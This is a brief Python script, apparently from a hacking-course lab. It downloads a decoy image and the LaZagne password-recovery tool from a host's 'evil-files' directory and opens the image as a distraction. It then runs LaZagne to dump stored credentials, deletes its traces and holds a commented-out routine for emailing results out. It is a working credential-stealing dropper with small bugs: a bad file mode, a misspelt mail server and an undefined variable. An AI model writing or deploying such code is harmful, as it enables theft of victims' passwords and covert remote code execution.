#!/usr/bin/env python
import requests,subprocess,smtplib,os,tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")
    with open(file_name[-1], "wd") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smptp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://10.0.2.15/evil-files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://10.0.2.15/evil-files/lazagne.exe")
subprocess.call("lazagne.exe all", shell=True)

os.remove("car.jpg")
os.remove("lazagne.exe")
#send_mail("wadaw@gmail.com", "abc123", result)